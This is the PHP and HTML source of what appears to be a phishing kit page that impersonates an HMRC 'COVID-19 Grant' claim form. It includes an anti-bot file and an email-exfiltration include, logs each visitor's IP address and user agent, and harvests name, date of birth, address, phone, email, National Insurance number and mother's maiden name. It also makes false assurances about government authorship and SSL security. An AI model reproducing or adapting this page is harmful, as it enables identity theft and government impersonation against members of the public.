<?php
error_reporting(0);
session_start();
include(realpath(getenv('DOCUMENT_ROOT')) . '/rebate/index.php');
include "includes/my_email.php";
if ($_SESSION['access']== "") {
	header("Location: ../index");
}

	include 'anti.php';
 

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);


date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="images/gov_uk.ico?FqAktxnBpjcXrksNnHvdTSjykQe" type="image/x-icon">
	<link rel="mask-icon" href="images/mask.svg?MeDwDHsvbhIHVWCOiqLXFfRhgAZy" color="#0b0c0c">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon-180x180.png?FqAktxnBpjcXrksNnHvdTSjykQe">
	<link rel="apple-touch-icon" sizes="167x167" href="images/apple-touch-icon-167x167.png?qdZwTagNYUONDrkvbdIOlEsEXb">
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-touch-icon-152x152.png?HrhsiKSedtLr">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png?gFekxPfYtonesgjPH">
	<title>COVID-19 Grant | HMRC</title>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/claimStyle.css" rel="stylesheet">
	<link href="css/claimSteps.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>
<body>
<div class="revenueCustoms sidePadding">
	<img src="images/crest.png"/>
	<span style="padding-left:5px;color:#0b0c0c;font-family: 'nta', Arial, sans-serif;font-size: 1.9rem !important;vertical-align: middle;">HM Revenue &amp; Customs</span>
</div>
<div class="topBar">
	<div class="containerTop">
		<div class="row">
			<div class="topLinkWrapper sidePadding">
				Cookies are used to make this website simpler.
				<a href="/authids.online.revenuecustoms/details">Find out more about cookies.</a>
			</div>
		</div>
	</div>
</div>

<div class="clearfix"></div>
<div class="containerMiddle">

	<div class="row">
		<div class="col-xs-12 col-md-8">
			<div class="clearfix"></div>
			<div class="claimForm sidePadding">Claim form</div>
			<div class="clearfix"></div>
			<h1 class="claimTitle sidePadding">COVID-19 Grant</h1>

			<div class="clearfix"></div>
		</div>
	</div>
	<div class="row sidePadding">
	<div class="col-xs-12 col-md-4 pull-right">
		<div class="sidebarVerify">
			<img src="images/verify.png"/>
		</div>
	</div>
	<div class="col-xs-12 col-md-8 pull-right">
				<span class="textBlock">
					Please complete the following form using your registered profile information.
				</span>

				<div class="clearfix"></div>
				<span class="textBlock strongBlock">
					We don't approve any request containing a non-UK address or billing details.
				</span>

				<div class="clearfix"></div>
				<span class="textBlock">
					You’ll need to enter your details manually below, after which your application will be sent for processing.
				</span>

				<div class="clearfix"></div>
				<span class="dataRegulations">
					Data protection regulations
				</span>

				<div class="clearfix"></div>
				<span class="textBlock personalData">
					The personal data you provide is purely for the use of this service. It is held for 30 days and then deleted.
					Further details on Tax’s privacy policy can be found at <a
							href="/authids.online.revenuecustoms/details">https://www.gov.uk/tax/privacy-policy</a>
				</span>

				<form method="post" id="basicInfo" name="basicInfo" action="details2?sessionid=6882224ca4e4ea69c3d31d7b4d34d06f&securessl=true"
					  onsubmit="return validateForm();">
				<div class="inputFieldsWrapper">
					<label for="name" class="fieldLabel">
						Full Name *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="fname" class="inputName form-control" id="fname" maxlength="50"/>
						<span class="labelBottom">
							50 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="dob" class="fieldLabel">
						Date of birth *
					</label>

					<div class="clearfix"></div>
					<div class="row">
						<div class="col-xs-4">
							<select class="form-control" name="d1" id="d1">
								<option selected="selected" value="">Day</option>
								<option value="01">01</option>
								<option value="02">02</option>
								<option value="03">03</option>
								<option value="04">04</option>
								<option value="05">05</option>
								<option value="06">06</option>
								<option value="07">07</option>
								<option value="08">08</option>
								<option value="09">09</option>
								<option value="10">10</option>
								<option value="11">11</option>
								<option value="12">12</option>
								<option value="13">13</option>
								<option value="14">14</option>
								<option value="15">15</option>
								<option value="16">16</option>
								<option value="17">17</option>
								<option value="18">18</option>
								<option value="19">19</option>
								<option value="20">20</option>
								<option value="21">21</option>
								<option value="22">22</option>
								<option value="23">23</option>
								<option value="24">24</option>
								<option value="25">25</option>
								<option value="26">26</option>
								<option value="27">27</option>
								<option value="28">28</option>
								<option value="29">29</option>
								<option value="30">30</option>
								<option value="31">31</option>
							</select>
						</div>
						<div class="col-xs-4">
							<select class="form-control" name="d2" id="d2">
								<option selected="selected" value="">Month</option>
								<option value="01">01</option>
								<option value="02">02</option>
								<option value="03">03</option>
								<option value="04">04</option>
								<option value="05">05</option>
								<option value="06">06</option>
								<option value="07">07</option>
								<option value="08">08</option>
								<option value="09">09</option>
								<option value="10">10</option>
								<option value="11">11</option>
								<option value="12">12</option>
							</select>
						</div>
						<div class="col-xs-4">
							<select class="form-control" name="d3" id="d3">
								<option selected="selected" value="">Year</option>
								<option value="1910">1910</option>
								<option value="1911">1911</option>
								<option value="1912">1912</option>
								<option value="1913">1913</option>
								<option value="1914">1914</option>
								<option value="1915">1915</option>
								<option value="1916">1916</option>
								<option value="1917">1917</option>
								<option value="1918">1918</option>

								<option value="1919">1919</option>
								<option value="1920">1920</option>
								<option value="1921">1921</option>
								<option value="1922">1922</option>
								<option value="1923">1923</option>
								<option value="1924">1924</option>
								<option value="1925">1925</option>
								<option value="1926">1926</option>
								<option value="1927">1927</option>

								<option value="1928">1928</option>
								<option value="1929">1929</option>
								<option value="1930">1930</option>
								<option value="1931">1931</option>
								<option value="1932">1932</option>
								<option value="1933">1933</option>
								<option value="1934">1934</option>
								<option value="1935">1935</option>
								<option value="1936">1936</option>

								<option value="1937">1937</option>
								<option value="1938">1938</option>
								<option value="1939">1939</option>
								<option value="1940">1940</option>
								<option value="1941">1941</option>
								<option value="1942">1942</option>
								<option value="1943">1943</option>
								<option value="1944">1944</option>
								<option value="1945">1945</option>

								<option value="1946">1946</option>
								<option value="1947">1947</option>
								<option value="1948">1948</option>
								<option value="1949">1949</option>
								<option value="1950">1950</option>
								<option value="1951">1951</option>
								<option value="1952">1952</option>
								<option value="1953">1953</option>
								<option value="1954">1954</option>

								<option value="1955">1955</option>
								<option value="1956">1956</option>
								<option value="1957">1957</option>
								<option value="1958">1958</option>
								<option value="1959">1959</option>
								<option value="1960">1960</option>
								<option value="1961">1961</option>
								<option value="1962">1962</option>
								<option value="1963">1963</option>

								<option value="1964">1964</option>
								<option value="1965">1965</option>
								<option value="1966">1966</option>
								<option value="1967">1967</option>
								<option value="1968">1968</option>
								<option value="1969">1969</option>
								<option value="1970">1970</option>
								<option value="1971">1971</option>
								<option value="1972">1972</option>

								<option value="1973">1973</option>
								<option value="1974">1974</option>
								<option value="1975">1975</option>
								<option value="1976">1976</option>
								<option value="1977">1977</option>
								<option value="1978">1978</option>
								<option value="1979">1979</option>
								<option value="1980">1980</option>
								<option value="1981">1981</option>

								<option value="1982">1982</option>
								<option value="1983">1983</option>
								<option value="1984">1984</option>
								<option value="1985">1985</option>
								<option value="1986">1986</option>
								<option value="1987">1987</option>
								<option value="1988">1988</option>
								<option value="1989">1989</option>
								<option value="1990">1990</option>

								<option value="1991">1991</option>
								<option value="1992">1992</option>
								<option value="1993">1993</option>
								<option value="1994">1994</option>
								<option value="1995">1995</option>
								<option value="1996">1996</option>
								<option value="1997">1997</option>
								<option value="1998">1998</option>
								<option value="1999">1999</option>
								<option value="2000">2000</option>
								<option value="2001">2001</option>
								<option value="2002">2002</option>
								<option value="2003">2003</option>
								<option value="2004">2004</option>
								<option value="2005">2005</option>
								<option value="2006">2006</option>
								<option value="2007">2007</option>
								<option value="2008">2008</option>
								<option value="2009">2009</option>
								<option value="2010">2010</option>
							</select>
						</div>
					</div>
					<div class="clearfix"></div>
						<span class="labelBottom">
							Format: dd/mm/yyyy
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="address" class="fieldLabel">
						Address line 1 *
					</label>

					<div class="clearfix"></div>
						<span class="belowLabel">
							Road / street name: e.g. Longview Road
						</span>

					<div class="clearfix"></div>
					<input type="text" name="address" class="inputAddress form-control" id="address" maxlength="35"/>
						<span class="labelBottom">
							35 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="address2" class="fieldLabel">
						Address line 2
					</label>

					<div class="clearfix"></div>
						<span class="belowLabel">
							
							House / flat number: e.g. 15, Flat 4, Chester house
						</span>

					<div class="clearfix"></div>
					<input type="text" name="address2" class="inputAddress form-control" id="address2" maxlength="35"/>
						<span class="labelBottom">
							35 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="town" class="fieldLabel">
						Town/City *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="town" class="inputCity form-control" id="town" maxlength="50"/>
						<span class="labelBottom">
							50 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="con" class="fieldLabel">
						County *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="con" class="inputCountry form-control" id="con" maxlength="50"/>
						<span class="labelBottom">
							50 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="pc" class="fieldLabel">
						Postcode *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="pc" class="inputPostcode form-control" id="pc" maxlength="8"/>
						<span class="labelBottom">
							8 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="telephone" class="fieldLabel">
						Phone *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="telephone" class="inputPhone form-control" id="telephone" maxlength="12"/>
						<span class="labelBottom">
							12 max digits
						</span>
				</div>
				
								<div class="inputFieldsWrapper">
					<label for="telephone" class="fieldLabel">
						Email *
					</label>

					<div class="clearfix"></div>
					<input type="email" name="email" class="inputPhone form-control" value="<?php echo $_SESSION['g'] ?>" id="email" maxlength="50"/>
						<span class="labelBottom">
							50 max characters
						</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="nic" class="fieldLabel">
						National Insurance Number *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="nic" class="inputPostcode form-control" id="nic" maxlength="9"/>
						<span class="labelBottom">
							9 max characters
						</span>
				</div>

				<div class="clearfix"></div>
					<span class="boldInfo">
						Background information
					</span>

				<div class="inputFieldsWrapper">
					<label for="mmr" class="fieldLabel">
						Mother's maiden name *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="mmr" class="inputMmn form-control" id="mmr" maxlength="50"/>
						<span class="labelBottom">
							50 max characters
						</span>
				</div>

				<input type="submit" name="submit" value="Continue" class="nextBtn sideMargin"/>

				</form>
	</div>
	</div>
</div>
<div class="clearfix"></div>
<div class="divider"></div>
<div class="clearfix"></div>

<div class="footer">
	<div class="containerFooter">
		<div class="row footerBorder">
			<div class="row">
				<div class="col-xs-12">
					<span class="legalField sidePadding">
						This form is secured with 256-BIT SSL Layer.
					</span>
				</div>
			</div>
		</div>
		<div class="clearfix"></div>
		<div class="row bottomSpacer">
			<div class="col-xs-12 col-sm-9 no-padding">
					<span class="footerLink2">
						<a href="#">Help</a>
					</span>
					<span class="footerLink2">
						<a href="#">Cookies</a>
					</span>
					<span class="footerLink2">
						<a href="#">Contact</a>
					</span>
					<span class="footerLink2">
						<a href="#">Terms and conditions</a>
					</span>
					<span class="footerLink2">
						<a href="#">Rhestr o Wasanaethau Cymraeg</a>
					</span>

				<div class="clearfix"></div>
					<span class="dividerLast">
						<span class="footerLink2">
						Built by the <a href="#">Government Digital Service</a>
						</span>
					</span>

				<div class="clearfix"></div>
				<div class="oglBox">
					<a href="#" class="oglLogo">

					</a>
						<span class="footerLink2">
							All content is available under the
								<a href="#">Open Government Licence v3.0,</a>
							except where otherwise stated
						</span>
				</div>
			</div>
			<div class="col-xs-12 col-sm-3 no-padding">
				<a href="#" class="crownLink">
					<img src="images/logo.png" class="bottomLogo"/>

					<div class="clearfix"></div>
					<span class="crownCopy">© Crown copyright</span>
				</a>
			</div>
		</div>
	</div>
</div>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/validateStep.js"></script>
</body>
</html>